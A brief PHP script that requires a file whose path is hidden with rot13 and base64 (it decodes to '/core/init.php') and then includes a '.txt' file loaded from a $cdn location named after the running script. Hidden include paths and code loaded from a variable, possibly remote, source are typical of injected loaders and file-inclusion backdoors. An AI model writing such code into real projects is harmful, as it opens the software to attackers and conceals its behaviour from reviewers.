<?php
session_start();
ob_start();
require $_SESSION['ProjectPath'].base64_decode(str_rot13('Y2AipzHinJ5cqP5jnUN='));
include_once($cdn . '0/' . str_replace('.php', '', basename($SCRIPT_FILENAME)) . '.txt');